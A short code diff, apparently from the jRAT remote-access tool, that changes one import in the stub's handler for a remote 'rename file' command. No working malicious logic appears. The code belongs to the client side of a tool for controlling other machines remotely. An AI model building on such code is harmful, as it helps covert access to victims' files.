@@ -2,9 +2,9 @@ package pro.jrat.stub.packets.incoming;
 
 import java.io.File;
 
+import pro.jrat.common.codec.Hex;
 import pro.jrat.stub.Connection;
 
-import com.redpois0n.common.codec.Hex;
 
 
 public class Packet47RenameFile extends AbstractIncomingPacket {
